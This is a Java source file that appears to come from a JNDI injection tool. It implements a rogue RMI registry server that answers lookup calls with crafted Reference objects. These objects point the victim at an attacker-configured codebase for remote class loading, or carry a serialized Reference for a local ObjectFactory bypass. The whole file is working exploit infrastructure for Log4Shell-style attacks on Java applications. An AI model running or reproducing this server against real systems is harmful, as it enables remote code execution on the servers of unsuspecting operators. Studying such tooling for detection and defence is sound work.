package map.jndi.server;

import map.jndi.Main;
import map.jndi.Dispatcher;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import sun.rmi.server.UnicastServerRef;
import sun.rmi.transport.TransportConstants;

import javax.naming.Reference;
import javax.net.ServerSocketFactory;
import java.io.*;
import java.lang.reflect.Field;
import java.net.*;
import java.rmi.MarshalException;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObject;
import java.rmi.server.UID;
import java.util.Arrays;

public class RMIServer implements Runnable {

    public String ip;
    public int port;
    private ServerSocket ss;
    private final Object waitLock = new Object();
    private boolean exit;
    private boolean hadConnection;

    public RMIServer(String ip, int port) {
        try {
            this.ip = ip;
            this.port = port;
            this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public boolean waitFor(int i) {
        try {
            if (this.hadConnection) {
                return true;
            }
            System.out.println("[RMI] Waiting for connection");
            synchronized (this.waitLock) {
                this.waitLock.wait(i);
            }
            return this.hadConnection;
        }
        catch (InterruptedException e) {
            return false;
        }
    }

    public void close() {
        this.exit = true;
        try {
            this.ss.close();
        }
        catch (IOException e) {}
        synchronized (this.waitLock) {
            this.waitLock.notify();
        }
    }

    @Override
    public void run() {
        System.out.println("[RMI] Listening on " + this.ip + ":" + this.port);
        try {
            Socket s = null;
            try {
                while (!this.exit && (s = this.ss.accept()) != null) {
                    try {
                        s.setSoTimeout(5000);
                        InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();
                        System.out.println("\n[RMI] Have connection from " + remote);

                        InputStream is = s.getInputStream();
                        InputStream bufIn = is.markSupported() ? is : new BufferedInputStream(is);

                        // Read magic (or HTTP wrapper)
                        bufIn.mark(4);
                        try (DataInputStream in = new DataInputStream(bufIn)) {
                            int magic = in.readInt();

                            short version = in.readShort();
                            if (magic != TransportConstants.Magic || version != TransportConstants.Version) {
                                s.close();
                                continue;
                            }

                            OutputStream sockOut = s.getOutputStream();
                            BufferedOutputStream bufOut = new BufferedOutputStream(sockOut);
                            try (DataOutputStream out = new DataOutputStream(bufOut)) {

                                byte protocol = in.readByte();
                                switch (protocol) {
                                    case TransportConstants.StreamProtocol:
                                        out.writeByte(TransportConstants.ProtocolAck);
                                        if (remote.getHostName() != null) {
                                            out.writeUTF(remote.getHostName());
                                        }
                                        else {
                                            out.writeUTF(remote.getAddress().toString());
                                        }
                                        out.writeInt(remote.getPort());
                                        out.flush();
                                        in.readUTF();
                                        in.readInt();
                                    case TransportConstants.SingleOpProtocol:
                                        doMessage(s, in, out);
                                        break;
                                    default:
                                    case TransportConstants.MultiplexProtocol:
                                        System.out.println("[RMI] Unsupported protocol");
                                        s.close();
                                        continue;
                                }

                                bufOut.flush();
                                out.flush();
                            }
                        }
                    }
                    catch (InterruptedException e) {
                        return;
                    }
                    catch (Exception e) {
                        e.printStackTrace(System.err);
                    }
                    finally {
                        System.out.println("[RMI] Closing connection");
                        s.close();
                    }
                }
            }
            finally {
                if (s != null) {
                    s.close();
                }
                if (this.ss != null) {
                    this.ss.close();
                }
            }
        }
        catch (SocketException e) {
            return;
        }
        catch (Exception e) {
            e.printStackTrace(System.err);
        }
    }

    private void doMessage(Socket s, DataInputStream in, DataOutputStream out) throws Exception {
        System.out.println("[RMI] Reading message...");

        int op = in.read();

        switch (op) {
            case TransportConstants.Call:
                // service incoming RMI call
                doCall(s, in, out);
                break;

            case TransportConstants.Ping:
                // send ack for ping
                out.writeByte(TransportConstants.PingAck);
                break;

            case TransportConstants.DGCAck:
                UID.read(in);
                break;

            default:
                throw new IOException("unknown transport op " + op);
        }

        s.close();
    }

    private void doCall(Socket s, DataInputStream in, DataOutputStream out) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(in) {
            @Override
            protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException {
                if ("[Ljava.rmi.server.ObjID;".equals(desc.getName())) {
                    return ObjID[].class;
                }
                else if ("java.rmi.server.ObjID".equals(desc.getName())) {
                    return ObjID.class;
                }
                else if ("java.rmi.server.UID".equals(desc.getName())) {
                    return UID.class;
                }
                else if ("java.lang.String".equals(desc.getName())) {
                    return String.class;
                }
                throw new IOException("Not allowed to read object");
            }
        };

        ObjID read;
        try {
            read = ObjID.read(ois);
        }
        catch (java.io.IOException e) {
            throw new MarshalException("unable to read objID", e);
        }

        if (read.hashCode() == 2) {
            // DGC
            handleDGC(ois);
        }
        else if (read.hashCode() == 0) {
            if (handleRMI(s, ois, out)) {
                this.hadConnection = true;
                synchronized (this.waitLock) {
                    this.waitLock.notifyAll();
                }
                return;
            }
        }
    }

    private boolean handleRMI(Socket s, ObjectInputStream ois, DataOutputStream out) throws Exception {
        int method = ois.readInt(); // method
        ois.readLong(); // hash

        if (method != 2) { // lookup
            return false;
        }

        String object = (String) ois.readObject();
        System.out.println("[RMI] Is RMI.lookup call for " + object + " " + method);

        out.writeByte(TransportConstants.Return);// transport op
        try (ObjectOutputStream oos = new MarshalOutputStream(out, Main.config.codebase)) {

            oos.writeByte(TransportConstants.NormalReturn);
            new UID().write(oos);

            String path = "/" + object; // 获取路由

            System.out.println("[RMI] Send result for " + path);

            // 路由分发, 为其匹配对应的 Controller 和方法
            Object result;

            if (Main.config.url != null) {
                result = Dispatcher.getInstance().service(Main.config.url);
            } else {
                result = Dispatcher.getInstance().service(path);
            }

            ReferenceWrapper wrapper;

            if (result instanceof Reference) {
                // 返回序列化后的 Reference/ResourceRef 对象, 用于本地 ObjectFactory 绕过
                wrapper = new ReferenceWrapper((Reference) result);
            } else {
                // 返回 Reference 对象, 指定 codebase, 用于常规 JNDI 注入
                Reference ref = new Reference("foo", (String) result, Main.config.codebase);
                wrapper = new ReferenceWrapper(ref);
            }

            Field refField = RemoteObject.class.getDeclaredField("ref");
            refField.setAccessible(true);
            refField.set(wrapper, new UnicastServerRef(12345));

            oos.writeObject(wrapper);

            oos.flush();
            out.flush();
        }
        return true;
    }

    private static void handleDGC(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.readInt(); // method
        ois.readLong(); // hash
        System.out.println("[RMI] Is DGC call for " + Arrays.toString((ObjID[]) ois.readObject()));
    }

    static final class MarshalOutputStream extends ObjectOutputStream {

        private String sendUrl;

        public MarshalOutputStream(OutputStream out, String u) throws IOException {
            super(out);
            this.sendUrl = u;
        }

        MarshalOutputStream(OutputStream out) throws IOException {
            super(out);
        }

        @Override
        protected void annotateClass(Class<?> cl) throws IOException {
            if (this.sendUrl != null) {
                writeObject(this.sendUrl);
            }
            else if (!(cl.getClassLoader() instanceof URLClassLoader)) {
                writeObject(null);
            }
            else {
                URL[] us = ((URLClassLoader) cl.getClassLoader()).getURLs();
                String cb = "";

                for (URL u : us) {
                    cb += u.toString();
                }
                writeObject(cb);
            }
        }

        @Override
        protected void annotateProxyClass(Class<?> cl) throws IOException {
            annotateClass(cl);
        }
    }
}